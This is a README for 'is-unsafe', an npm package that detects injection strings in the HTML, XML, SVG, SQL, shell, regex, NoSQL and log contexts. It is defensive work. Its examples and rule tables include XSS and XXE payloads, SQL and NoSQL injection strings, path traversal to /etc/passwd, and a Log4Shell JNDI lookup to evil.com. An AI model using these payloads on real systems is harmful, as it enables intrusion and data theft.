# `is-unsafe`

> Zero-dependency, DOM-free, pure predicate for detecting unsafe strings across HTML, XML, SVG, SQL, SQL-STRICT, SHELL, REDOS, NOSQL, and LOG contexts.

[![npm version](https://img.shields.io/npm/v/is-unsafe.svg)](https://www.npmjs.com/package/is-unsafe)
[![license](https://img.shields.io/npm/l/is-unsafe.svg)](LICENSE)

---

## Why `is-unsafe`?

Sanitizer libraries like [DOMPurify](https://github.com/cure53/DOMPurify) require a DOM. They cannot run inside XML parsers, template engines, or server-side pipelines that process strings before they ever reach a browser.

`is-unsafe` fills that gap. It is a **pure predicate** — it answers one question:

> *Is this string value unsafe in a given context?*

It never mutates strings. It never touches the DOM. It has zero runtime dependencies.

### Motivating use case: `@nodable/entities` / `fast-xml-parser`

DOCTYPE blocks can define custom entities with arbitrary values:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE urlset [
  <!ENTITY xss '</script><script>alert(document.domain)</script><x y="'>
]>
<urlset>
  <url><loc>https://example.com/&xss;</loc></url>
</urlset>
```

When `@nodable/entities` resolves `&xss;`, it produces a raw string containing `</script><script>alert(...)`. Whether that string is dangerous depends on where it ends up. `is-unsafe` answers that question — without a DOM.

---

## Installation

```sh
npm install is-unsafe
```

---

## Quick start

```js
import { isUnsafe } from 'is-unsafe';

isUnsafe('<script>alert(1)</script>', 'HTML')     // → true
isUnsafe('New York, NY',             'HTML')     // → false

isUnsafe("' OR 1=1--",               'SQL')      // → true
isUnsafe('../etc/passwd',            'SHELL')    // → true
isUnsafe('(a+)+',                    'REDOS')    // → true  (ReDoS risk)
isUnsafe('{"$ne": null}',            'NOSQL')    // → true
isUnsafe('${jndi:ldap://evil.com}',  'LOG')      // → true  (Log4Shell)
```

---

## API

### `isUnsafe(value, context)` → `boolean`

Returns `true` if `value` is unsafe in the given context, `false` otherwise.

| Parameter | Type | Description |
|-----------|------|-------------|
| `value` | `string` | The string to test. Throws `TypeError` if not a string. |
| `context` | `string \| string[] \| RegExp` | Context name, array of context names, or a custom `RegExp`. |

```js
// Single context
isUnsafe(value, 'HTML')

// Multiple contexts — true if unsafe in ANY of them
isUnsafe(value, ['HTML', 'XML'])

// Custom RegExp — true if pattern matches
isUnsafe(value, /my-pattern/i)
```

---

### `whyUnsafe(value, context)` → `MatchResult | null`

Like `isUnsafe`, but returns a `MatchResult` object describing the **first** matching rule, or `null` if the value is safe. Useful for logging and error messages.

```js
import { whyUnsafe } from 'is-unsafe';

const result = whyUnsafe('<script>alert(1)</script>', 'HTML');
// {
//   context:     'HTML',
//   id:          'html-script-open',
//   description: '<script opening tag',
//   pattern:     /<script[\s>/]/i
// }
```

---

### `allUnsafe(value, context)` → `MatchResult[]`

Returns **all** matching rules across the given context(s), or an empty array if safe. Useful for comprehensive audits.

```js
import { allUnsafe } from 'is-unsafe';

const findings = allUnsafe('<script onload="x"></script>', 'HTML');
// [
//   { context: 'HTML', id: 'html-script-open',          ... },
//   { context: 'HTML', id: 'html-script-close',         ... },
//   { context: 'HTML', id: 'html-inline-event-handler', ... }
// ]
```

---

### `VALID_CONTEXTS`

Exported array of all built-in context names.

```js
import { VALID_CONTEXTS } from 'is-unsafe';
// {
//     readonly HTML: "HTML";
//     readonly XML: "XML";
//     readonly SVG: "SVG";
//     readonly SQL: "SQL";
//     readonly "SQL-STRICT": "SQL-STRICT";
//     readonly SHELL: "SHELL";
//     readonly REDOS: "REDOS";
//     readonly NOSQL: "NOSQL";
//     readonly LOG: "LOG";
// }
```

---

## Contexts

### `'HTML'`

XSS vectors when a string is rendered as HTML:

| Rule ID | What it catches |
|---------|----------------|
| `html-script-open` | `<script` opening tag |
| `html-script-close` | `</script>` closing tag |
| `html-javascript-protocol` | `javascript:` URI (with whitespace obfuscation) |
| `html-vbscript-protocol` | `vbscript:` URI |
| `html-data-html` | `data:text/html` URI |
| `html-data-xhtml` | `data:application/xhtml+xml` URI |
| `html-data-svg` | `data:image/svg+xml` URI |
| `html-inline-event-handler` | `onclick=`, `onerror=`, `onload=`, etc. |
| `html-entity-obfuscated-script` | `&#x3C;script`, `&#60;script`, `&lt;script` |
| `html-entity-obfuscated-javascript` | Hex/decimal entity encoding of `javascript:` |
| `html-style-expression` | CSS `expression()` — IE code execution |
| `html-object-embed` | `<object>` and `<embed>` tags |
| `html-base-tag` | `<base href=` — relative URL hijacking |
| `html-meta-refresh` | `<meta http-equiv="refresh"` |
| `html-srcdoc` | `srcdoc=` attribute on iframes |
| `html-iframe` | `<iframe` tag |
| `html-form` | `<form` tag — phishing injection |

---

### `'XML'`

Parser-level attacks in XML documents (distinct from HTML XSS):

| Rule ID | What it catches |
|---------|----------------|
| `xml-cdata-injection` | `<![CDATA[` injection |
| `xml-cdata-close` | `]]>` — closes an enclosing CDATA section |
| `xml-processing-instruction` | `<?xml-stylesheet`, `<?php`, `<?asp` |
| `xml-doctype-injection` | `<!DOCTYPE` embedded in content |
| `xml-entity-system` | `SYSTEM "..."` — XXE external entity |
| `xml-entity-public` | `PUBLIC "..."` — XXE external entity |
| `xml-entity-declaration` | `<!ENTITY` declaration |
| `xml-billion-laughs` | Repeated entity refs `&e1;&e2;&e3;` — expansion attack |
| `xml-namespace-confusion` | `xmlns=` attribute injection |
| `xml-comment-injection` | `<!--` comment open |
| `xml-comment-close` | `-->` comment close |
| `xml-pi-close` | `?>` processing instruction close |

---

### `'SVG'`

SVG-specific XSS vectors that bypass HTML-only sanitizers (including documented DOMPurify bypass patterns):

| Rule ID | What it catches |
|---------|----------------|
| `svg-script-element` | `<script` inside SVG |
| `svg-xlink-href-javascript` | `xlink:href="javascript:..."` |
| `svg-href-javascript` | `href="javascript:..."` |
| `svg-foreignobject` | `<foreignObject>` — embeds HTML inside SVG |
| `svg-use-external` | `<use href=` pointing to external URL |
| `svg-animate-href` | `<animate attributeName="href"` — dynamic href injection |
| `svg-animate-xlinkhref` | `<animate attributeName="xlink:href"` |
| `svg-set-javascript` | `<set to="javascript:..."` |
| `svg-event-handler` | SVG event handlers (`onload=`, `onactivate=`, `onbegin=`, etc.) |
| `svg-filter-feimage` | `<feImage href=` — external resource load |
| `svg-image-external` | `<image xlink:href=` with http/javascript URL |
| `svg-style-javascript` | `style=` containing `javascript:` |

---

### `'SQL'` and `'SQL-STRICT'`

Two tiers of SQL injection detection, chosen based on what kind of input you're validating.

**Use `'SQL'`** for general user-facing fields (names, descriptions, search queries). Its 15 rules are high-precision with very low false-positive risk.

**Use `'SQL-STRICT'`** when the input is specifically a SQL fragment or database identifier — it includes all `SQL` rules plus three additional rules that would produce false positives on general text:

| Extra rule in SQL-STRICT | Why it's noisy on general text |
|--------------------------|-------------------------------|
| `sql-line-comment` (`--`) | Fires on `"see note -- above"`, CSS `var(--primary)` |
| `sql-stacked-query` (`;SELECT`) | Semicolons are normal punctuation |
| `sql-hex-encoding` (`0xDEAD`) | Hex values appear in technical docs and logs |

**Base `SQL` rules (present in both):**

| Rule ID | What it catches |
|---------|----------------|
| `sql-block-comment-open` | `/*` block comment |
| `sql-union-select` | `UNION SELECT`, `UNION ALL SELECT` |
| `sql-drop-table` | `DROP TABLE` |
| `sql-drop-database` | `DROP DATABASE` |
| `sql-insert-into` | `INSERT INTO` |
| `sql-delete-from` | `DELETE FROM` |
| `sql-update-set` | `UPDATE ... SET` |
| `sql-exec-xp` | `EXEC xp_` — MSSQL extended stored procedures |
| `sql-tautology-string` | `' OR '1'='1` string tautologies |
| `sql-tautology-numeric` | `OR 1=1` numeric tautology |
| `sql-always-true-zero` | `OR 0=0` numeric tautology |
| `sql-sleep-benchmark` | `SLEEP()`, `BENCHMARK()` — time-based blind injection |
| `sql-waitfor-delay` | `WAITFOR DELAY` — MSSQL time-based blind |
| `sql-char-function` | `CHAR(65)` — character obfuscation |
| `sql-information-schema` | `INFORMATION_SCHEMA` — reconnaissance |

---

### `'SHELL'`

Shell injection and path traversal:

| Rule ID | What it catches |
|---------|----------------|
| `shell-path-traversal-unix` | `../` directory traversal |
| `shell-path-traversal-windows` | `..\` Windows traversal |
| `shell-path-traversal-encoded` | `%2e%2e` URL-encoded traversal |
| `shell-null-byte` | `\x00` or `%00` null byte injection |
| `shell-semicolon` | `;` command separator |
| `shell-pipe` | `\|` pipe operator |
| `shell-and-operator` | `&&` AND operator |
| `shell-or-operator` | `\|\|` OR operator |
| `shell-backtick` | `` ` `` backtick substitution |
| `shell-dollar-paren` | `$(cmd)` command substitution |
| `shell-dollar-brace` | `${var}` variable expansion |
| `shell-redirect-out` | `>` or `>>` output redirection |
| `shell-redirect-in` | `<` input redirection |
| `shell-newline-injection` | `\n` or `\r` newline injection |
| `shell-glob-star` | `/*` or `\*` glob after path separator |
| `shell-absolute-root` | Strings starting with `/` or `\\` (UNC) |
| `shell-windows-drive` | `C:\` or `D:/` Windows drive paths |
| `shell-curl-wget` | `curl https://...` or `wget -` with URL or flags |

> **Note:** The `SHELL` context is intentionally broad. Characters like `;`, `|`, and `<` appear in many safe strings, so apply this context only to values destined for shell execution or filesystem operations, not to general text.

---

### `'REDOS'`

Strings that would cause catastrophic backtracking if compiled as a `RegExp`:

| Rule ID | What it catches |
|---------|----------------|
| `redos-nested-quantifier-plus` | `(a+)+`, `(.+b)*` — nested `+` in group with outer quantifier |
| `redos-nested-quantifier-star` | `(a*)*` — nested `*` in group with outer quantifier |
| `redos-nested-groups` | `((a+)+)` — doubly nested quantified groups |
| `redos-alternation-overlap` | `(a\|a)+` — repeated identical alternatives |
| `redos-star-plus-concat` | `(a*a)+` — star-concat pattern |
| `redos-dot-star-greedy` | `(.*){n}` — repeated greedy dot |
| `redos-large-repetition` | `{1000,}` or `{5000,10000}` — extremely large repetition counts |
| `redos-catastrophic-alternation` | 10+ pipe alternatives in one group |

---

### `'NOSQL'`

MongoDB query operator injection and prototype pollution:

| Rule ID | What it catches |
|---------|----------------|
| `nosql-where-operator` | `$where:` — executes arbitrary JavaScript server-side |
| `nosql-ne-operator` | `$ne:` — not-equal authentication bypass |
| `nosql-gt-operator` | `$gt:` / `$gte:` — greater-than bypass |
| `nosql-lt-operator` | `$lt:` / `$lte:` — less-than bypass |
| `nosql-regex-operator` | `$regex:` — blind character-by-character extraction |
| `nosql-or-operator` | `$or: [` — always-true condition injection |
| `nosql-and-operator` | `$and: [` — logical AND injection |
| `nosql-nor-operator` | `$nor: [` — logical NOR injection |
| `nosql-exists-operator` | `$exists:` — field enumeration |
| `nosql-in-operator` | `$in: [` — value enumeration |
| `nosql-expr-operator` | `$expr:` — aggregation expression injection |
| `nosql-function-operator` | `$function:` — arbitrary JavaScript (MongoDB 4.4+) |
| `nosql-accumulator-operator` | `$accumulator:` — custom JS aggregation |
| `nosql-proto-pollution` | `__proto__` — prototype pollution |
| `nosql-constructor-prototype` | `constructor.prototype` or JSON key adjacency |
| `nosql-proto-bracket` | `["__proto__"]` — bracket-notation prototype pollution |

Patterns handle both bare form (`$ne: null`) and JSON key form (`{"$ne": null}`) by allowing an optional closing quote between the operator name and the colon.

---

### `'LOG'`

Injection vectors dangerous when a string is written to a log file or passed to a logging framework:

| Rule ID | What it catches |
|---------|----------------|
| `log-crlf-injection` | Literal `\r` or `\n` — fake log line injection |
| `log-url-encoded-crlf` | `%0d`, `%0a`, `%0D`, `%0A` — URL-encoded newlines |
| `log-unicode-newline` | U+2028, U+2029 — Unicode line/paragraph separators |
| `log-log4shell-jndi` | `${jndi:...}` — Log4Shell RCE (CVE-2021-44228) |
| `log-log4shell-obfuscated` | `${::-` — Log4j WAF-bypass prefix |
| `log-log4j-lookup` | `${env:}`, `${sys:}`, `${ctx:}` — data exfiltration lookups |
| `log-ssti-double-brace` | `{{expression}}` — Jinja2, Twig, Handlebars SSTI |
| `log-ssti-hash-brace` | `#{expression}` — Thymeleaf, Velocity, ERB SSTI |
| `log-ssti-dollar-brace` | `${expr.method()}` — JSP EL, Freemarker, SpEL SSTI |
| `log-ssti-percent-tag` | `<%= expression %>` — Ruby ERB, ASP |
| `log-null-byte` | `\x00` or `%00` — truncates log entries |
| `log-ansi-escape` | `ESC[` — ANSI escape sequences that manipulate terminal output |

> **Note:** The `log-crlf-injection` rule flags literal newline characters (`\n`, `\r`). Apply `LOG` only to single-line log field values (usernames, IDs, request parameters), not to multi-line content.

---

## Integration examples

### `@nodable/entities` — `postCheck` callback

```js
import { isUnsafe } from 'is-unsafe';
import { EntityDecoder, ALL_ENTITIES } from '@nodable/entities';

const dec = new EntityDecoder({
  namedEntities: ALL_ENTITIES,
  postCheck: (resolved, original) => {
    if (isUnsafe(resolved, 'HTML')) {
      return original;               // keep literal &entity; reference
      // or: throw new Error(`Unsafe entity blocked: ${original}`);
      // or: return '[BLOCKED]';
    }
    return resolved;
  }
});
```

### Logging with `whyUnsafe`

```js
import { isUnsafe, whyUnsafe } from 'is-unsafe';

function safeInsert(value, context) {
  if (isUnsafe(value, context)) {
    const reason = whyUnsafe(value, context);
    logger.warn('Blocked unsafe value', { ruleId: reason.id, context });
    throw new Error(`Unsafe value rejected (${reason.id})`);
  }
  return value;
}
```

### Auditing with `allUnsafe`

```js
import { allUnsafe } from 'is-unsafe';

const findings = allUnsafe(userInput, ['HTML', 'SQL', 'SHELL']);
if (findings.length > 0) {
  auditLog.record({ input: userInput, findings: findings.map(f => f.id) });
}
```

### SQL vs SQL-STRICT — choosing the right tier

```js
import { isUnsafe } from 'is-unsafe';

// General text field (name, description, comment) — use SQL
function validateUserBio(bio) {
  if (isUnsafe(bio, 'SQL')) throw new Error('Invalid content');
  return bio;
}

// Dedicated SQL identifier input (table name picker, column filter) — use SQL-STRICT
function validateTableName(name) {
  if (isUnsafe(name, 'SQL-STRICT')) throw new Error('Invalid identifier');
  return name;
}

validateUserBio("see note -- above");  // passes (-- alone is fine for general text)
validateTableName("users -- comment"); // blocked by SQL-STRICT
```

### File upload path guard

```js
import { isUnsafe } from 'is-unsafe';

function validateUploadPath(filename) {
  if (isUnsafe(filename, 'SHELL')) throw new Error('Invalid filename');
  return filename;
}

validateUploadPath('document.pdf');          // OK
validateUploadPath('../../../etc/passwd');   // throws
validateUploadPath('file.txt\x00.jpg');      // throws (null byte)
```

### User-supplied regex guard

```js
import { isUnsafe, whyUnsafe } from 'is-unsafe';

function compileUserRegex(pattern) {
  if (isUnsafe(pattern, 'REDOS')) {
    const detail = whyUnsafe(pattern, 'REDOS');
    throw new Error(`ReDoS risk in pattern (${detail.id})`);
  }
  return new RegExp(pattern);
}

compileUserRegex('^[a-z]+$');   // OK
compileUserRegex('(a+)+');      // throws — nested quantifier
```

### MongoDB input guard

```js
import { isUnsafe } from 'is-unsafe';

function safeMongoValue(value) {
  if (isUnsafe(value, 'NOSQL')) throw new Error('Unsafe MongoDB value');
  return value;
}

safeMongoValue('alice');            // OK
safeMongoValue('{"$ne": null}');    // throws — $ne bypass
safeMongoValue('__proto__');        // throws — prototype pollution
```

### Log field guard

```js
import { isUnsafe } from 'is-unsafe';

function safeLogField(value) {
  if (isUnsafe(value, 'LOG')) throw new Error('Unsafe log value');
  return value;
}

safeLogField('alice');                      // OK
safeLogField('${jndi:ldap://evil.com}');    // throws — Log4Shell
safeLogField("value\nfake log entry");      // throws — CRLF injection
```

---

## Design principles

| Principle | Detail |
|-----------|--------|
| **Predicate only** | Returns `true`/`false`. Never mutates strings. |
| **Zero dependencies** | No jsdom, no DOM, no framework coupling. |
| **Context-aware** | "Unsafe" is not absolute — it depends on where the value will be used. |
| **Caller decides action** | `is-unsafe` classifies. Escaping, throwing, or logging is the caller's responsibility. |
| **ReDoS-safe** | All detection patterns use bounded quantifiers. The irony of a security package triggering its own vulnerability (as the `sql-injection` npm package does) is avoided by design. |
| **False positives over false negatives** | In parser context, blocking a legitimate value is better than passing a malicious one. |

---

## What `is-unsafe` is NOT

- **Not a sanitizer** — it does not modify strings
- **Not a middleware** — no Express/Koa coupling
- **Not a firewall** — it does not block requests
- **Not a complete security solution** — one layer of defence-in-depth

---

## Comparison with existing packages

| Package | Problem |
|---------|---------|
| `dompurify` | Requires DOM/jsdom. Sanitizer, not predicate. Has documented SVG/XML bypass vulnerabilities. |
| `xss` | Sanitizer — rewrites the string. HTML-only. No predicate API. |
| `xss-filters` | Explicitly documented as unable to be used inside `<svg>`, `<object>`, `<embed>`. |
| `xss-checker` | 465 kB payload list, 6 years abandoned, 5 dependents. |
| `is-sql-injection` | Philosophically closest, but v1.0.0 only, 8 years abandoned, 19 dependents. |
| `sql-injection` | Express middleware. Has an active ReDoS CVE on its own detection patterns. |
| **`is-unsafe`** | Actively maintained. DOM-free. Pure predicate. Covers HTML, XML, SVG, SQL (two tiers), SHELL, REDOS, NOSQL, and LOG as distinct contexts. |

The `SVG` context is the key differentiator for XSS — no existing package covers SVG-specific vectors (`xlink:href`, `foreignObject`, `animate`/`set` element attacks). The `XML` context covers parser-level attacks that DOMPurify has documented bypass vulnerabilities for. The `NOSQL` and `LOG` contexts (including Log4Shell) have no equivalent in any current predicate package.

---

## Running tests

```sh
npm install
npm test
```

Tests use [Jasmine](https://jasmine.github.io/). Source in `src/`, specs in `specs/`.

---

## License

MIT
